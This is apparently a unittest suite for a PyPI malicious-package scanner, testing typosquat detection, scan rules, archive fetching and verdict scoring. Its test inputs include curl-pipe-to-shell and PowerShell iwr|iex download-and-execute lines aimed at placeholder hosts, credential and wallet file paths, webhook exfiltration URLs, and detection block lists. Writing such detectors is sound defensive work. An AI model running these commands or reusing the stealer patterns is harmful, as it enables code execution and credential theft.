import unittest

from pkghunter.analyzer import scan_release
from pkghunter.fetch import Member, choose_artifacts, iter_members
from pkghunter.pypi import parse_feed
from pkghunter.rules import scan_member
from pkghunter.typosquat import TyposquatDetector, osa_distance

from helpers import BENIGN_LIB, BENIGN_SETUP, EVIL_SETUP, make_release, make_sdist, make_wheel

POPULAR = ["requests", "numpy", "python-dateutil", "matplotlib", "django", "beautifulsoup4"]


class TyposquatTests(unittest.TestCase):
    def setUp(self):
        self.d = TyposquatDetector(POPULAR)

    def test_distance(self):
        self.assertEqual(osa_distance("requests", "reqeusts"), 1)  # transposition
        self.assertEqual(osa_distance("requests", "requestss"), 1)
        self.assertEqual(osa_distance("numpy", "numpy"), 0)

    def test_detects_common_tricks(self):
        cases = {
            "reqeusts": "requests",
            "requestss": "requests",
            "pythondateutil": "python-dateutil",
            "django-dev": "django",
            "rnatplotlib": "matplotlib",
            "py-numpy": "numpy",
        }
        for name, target in cases.items():
            with self.subTest(name=name):
                hit = self.d.check(name)
                self.assertIsNotNone(hit)
                self.assertEqual(hit.target, target)

    def test_ignores_real_and_unrelated_names(self):
        for name in ["requests", "Python_DateUtil", "numpy-financial", "my-cool-tool"]:
            with self.subTest(name=name):
                self.assertIsNone(self.d.check(name))


class RuleTests(unittest.TestCase):
    def rule_ids(self, path, content):
        return {f.rule for f in scan_member(Member(path, len(content), content))}

    def test_evil_setup(self):
        ids = self.rule_ids("reqeusts-1.0/setup.py", EVIL_SETUP)
        for expected in ["EXEC_DECODED", "SETUP_NETWORK", "CMDCLASS_OVERRIDE", "EXFIL_ENDPOINT", "ENV_DUMP"]:
            self.assertIn(expected, ids)

    def test_benign_files(self):
        self.assertEqual(self.rule_ids("pkg/setup.py", BENIGN_SETUP), set())
        # network use in normal library code is not flagged
        self.assertEqual(self.rule_ids("pkg/tidy_helpers/net.py", BENIGN_LIB), set())

    def test_pth_and_binary(self):
        self.assertIn("PTH_EXEC", self.rule_ids("evil.pth", b"import os; os.system('x')\n"))
        self.assertIn("BUNDLED_EXECUTABLE", {f.rule for f in scan_member(Member("pkg/run.exe", 9000, None))})

    def test_install_time_weighting(self):
        f_setup = scan_member(Member("setup.py", 0, b'u = "https://webhook.site/x"'))[0]
        f_lib = scan_member(Member("pkg/a.py", 0, b'u = "https://webhook.site/x"'))[0]
        self.assertGreater(f_setup.weight, f_lib.weight)

    def test_tests_and_comments_are_discounted(self):
        code = b'os.system("curl -s http://x | sh")\n'
        real = scan_member(Member("pkg/core.py", 0, code))[0].weight
        in_tests = scan_member(Member("pkg/tests/test_core.py", 0, code))[0].weight
        self.assertLess(in_tests, real / 2)
        self.assertEqual(self.rule_ids("install.sh", b"#   curl -fsSL https://x/install.sh | sh\n"), set())

    def test_nested_setup_is_not_install_time(self):
        code = b'subprocess.run(["sh"])\n'
        self.assertIn("SETUP_PROCESS", self.rule_ids("pkg-1.0/setup.py", code))
        self.assertNotIn("SETUP_PROCESS", self.rule_ids("pkg-1.0/src/pkg/mac/setup.py", code))

    def test_setup_py_inside_wheel_is_not_install_time(self):
        code = b'subprocess.run(["sh"])\n'
        ids = {f.rule for f in scan_member(Member("pkg/setup.py", 0, code, in_wheel=True))}
        self.assertNotIn("SETUP_PROCESS", ids)

    def test_known_installers_allowed(self):
        self.assertEqual(self.rule_ids("a.py", b'cmd = "curl -fsSL https://astral.sh/uv/install.sh | sh"'), set())
        self.assertIn("DOWNLOAD_EXECUTE", self.rule_ids("a.py", b'cmd = "curl -s http://evil.example/x | sh"'))

    def test_install_instructions_for_humans_allowed(self):
        hints = [b'msg = "binary not found. Install with `curl -sSL https://tool.sh | sh`."',
                 b'raise SystemExit("To install, run: curl https://x.dev/install | bash")']
        for h in hints:
            self.assertNotIn("DOWNLOAD_EXECUTE", self.rule_ids("a.py", h))
        executed = b'subprocess.run("curl -s http://45.61.2.9/a | sh", shell=True)'
        self.assertIn("DOWNLOAD_EXECUTE", self.rule_ids("a.py", executed))

    def test_credential_paths_need_variety(self):
        one = scan_member(Member("a.py", 0, b'p = "~/.aws/credentials"'))[0].weight
        many = scan_member(Member("a.py", 0, b'p = ["Login Data", "Local State", "wallet.dat"]'))[0].weight
        self.assertLess(one, 10)
        self.assertGreaterEqual(many, 20)

    def test_download_command_needs_execution_sink(self):
        printed = scan_member(Member("a.py", 0, b'HELP = ("curl -fsSL https://x.dev/i.sh | bash "\n  "(Windows: ...)")\n'))
        ran = scan_member(Member("a.py", 0, b'cmd = "curl -s http://x.example/a | sh"\nos.system(cmd)\n'))
        self.assertLess(printed[0].weight, 15)
        self.assertEqual(ran[0].weight, 35)

    def test_domain_blocklists_are_defensive_code(self):
        blocklist = b'BLOCK = {"paste": ("pastebin.com", "paste.ee", "rentry.co"), "cap": ("webhook.site", "pipedream.net", "interact.sh")}'
        self.assertEqual(self.rule_ids("pkg/guard.py", blocklist), set())
        self.assertIn("EXFIL_ENDPOINT", self.rule_ids("pkg/x.py", b'U = "https://webhook.site/6f1c-41aa"'))

    def test_detection_regexes_are_defensive_code(self):
        guard = b'BLOCK = re.compile(r"(?:~/|\\$HOME/)\\.ssh/id_rsa|\\.aws/credentials|Login Data")\n'
        self.assertEqual(self.rule_ids("pkg/lint.py", guard), set())
        self.assertEqual(self.rule_ids("pkg/p.py", b'_PS_HTTP = {"invoke-webrequest", "iwr", "irm"}'), set())
        self.assertIn("DOWNLOAD_EXECUTE", self.rule_ids("pkg/p.py", b'c = "iwr http://45.61.2.9/a.ps1 | iex"'))
        self.assertEqual(self.rule_ids("pkg/a.py", b"install_hint=('curl -fsSL https://x.dev/i.sh | bash')"), set())

    def test_docstrings_are_prose_not_code(self):
        doc = b'def f():\n    """We sandbox ~/.ssh/id_rsa and ~/.aws/credentials and Login Data."""\n    return 1\n'
        self.assertEqual(self.rule_ids("pkg/sandbox.py", doc), set())

    def test_stealer_combo_needs_same_file(self):
        stealer = (b'paths = ["Login Data", "Local State", "wallet.dat"]\n'
                   b'HOOK = "https://discord.com/api/webhooks/1/x"\n')
        self.assertIn("STEALER_COMBO", self.rule_ids("pkg/__init__.py", stealer))
        self.assertNotIn("STEALER_COMBO", self.rule_ids("pkg/bot.py", b'API = "https://api.telegram.org/bot{t}/"'))

    def test_placeholder_ips_ignored(self):
        for ip in ["1.2.3.4", "203.0.113.9:11434", "172.16.1.1", "192.168.0.1"]:
            self.assertEqual(self.rule_ids("a.py", f'u = "http://{ip}/"'.encode()), set())
        self.assertIn("RAW_IP_URL", self.rule_ids("a.py", b'u = "http://45.61.2.9/p"'))

    def test_snippet_has_line_number(self):
        f = scan_member(Member("a.py", 0, b"x = 1\ny = 2\nexec(zlib.decompress(blob))\n"))[0]
        self.assertEqual((f.rule, f.line), ("EXEC_DECODED", 3))


class FetchTests(unittest.TestCase):
    def test_tar_skips_symlinks_and_reads_in_memory(self):
        data = make_sdist({"../escape.py": b"print(1)", "pkg/setup.py": BENIGN_SETUP},
                          symlink=("pkg/link.py", "/etc/passwd"))
        members = list(iter_members("pkg-1.0.tar.gz", data))
        self.assertEqual({m.path for m in members}, {"../escape.py", "pkg/setup.py"})
        self.assertTrue(all(m.content is not None for m in members))

    def test_wheel(self):
        data = make_wheel({"pkg/__init__.py": b"", "pkg/logo.png": b"\x89PNG"})
        members = {m.path: m for m in iter_members("pkg-1.0-py3-none-any.whl", data)}
        self.assertIsNone(members["pkg/logo.png"].content)  # non-text files are only listed

    def test_choose_artifacts(self):
        files = [
            {"packagetype": "bdist_wheel", "filename": "x-1-cp312-win_amd64.whl", "size": 10},
            {"packagetype": "bdist_wheel", "filename": "x-1-py3-none-any.whl", "size": 50},
            {"packagetype": "sdist", "filename": "x-1.tar.gz", "size": 5},
        ]
        names = [f["filename"] for f in choose_artifacts(files)]
        self.assertEqual(names, ["x-1.tar.gz", "x-1-py3-none-any.whl"])


class AnalyzerTests(unittest.TestCase):
    def setUp(self):
        self.d = TyposquatDetector(POPULAR)

    def test_malicious_typosquat(self):
        rel = make_release(name="reqeusts", version="1.0", releases=1, home_page="", description="")
        sdist = make_sdist({"reqeusts-1.0/setup.py": EVIL_SETUP})
        r = scan_release(rel, [("reqeusts-1.0.tar.gz", sdist)], self.d)
        self.assertEqual(r.verdict, "likely-malicious")
        self.assertEqual(r.squat.target, "requests")
        self.assertEqual(r.findings[0].rule, "SQUAT_WITH_CODE")

    def test_benign_package(self):
        rel = make_release()
        sdist = make_sdist({"tidy-helpers-0.3.1/setup.py": BENIGN_SETUP,
                            "tidy-helpers-0.3.1/tidy_helpers/net.py": BENIGN_LIB})
        r = scan_release(rel, [("tidy-helpers-0.3.1.tar.gz", sdist)], self.d)
        self.assertEqual(r.verdict, "clean")
        self.assertEqual(r.files_scanned, 2)

    def test_weak_signals_alone_stay_clean(self):
        rel = make_release(home_page="", description="", summary="")
        lib = b"import os, socket\nenv = dict(os.environ)\nhost = socket.gethostname()\n"
        r = scan_release(rel, [("x.tar.gz", make_sdist({"x-1/x/util.py": lib}))], self.d)
        self.assertEqual((r.verdict, r.score, r.findings), ("clean", 0, []))

    def test_lookalike_name_alone_is_not_suspicious(self):
        rel = make_release(name="reqeusts", home_page="")
        r = scan_release(rel, [], self.d)
        self.assertEqual(r.verdict, "clean")
        self.assertEqual(r.squat.target, "requests")

    def test_dependency_confusion_version(self):
        rel = make_release(name="acme-internal-utils", version="99.0.0", releases=1)
        r = scan_release(rel, [], self.d)
        self.assertIn("INFLATED_VERSION", {f.rule for f in r.findings})


class FeedTests(unittest.TestCase):
    def test_parse_feed(self):
        xml = b"""<?xml version="1.0"?><rss><channel>
          <item><title>foo added to PyPI</title><link>https://pypi.org/project/foo/</link></item>
          <item><title>bar 2.0</title><link>https://pypi.org/project/bar/2.0/</link></item>
        </channel></rss>"""
        items = parse_feed(xml, "test")
        self.assertEqual([(i.name, i.version) for i in items], [("foo", None), ("bar", "2.0")])


if __name__ == "__main__":
    unittest.main()
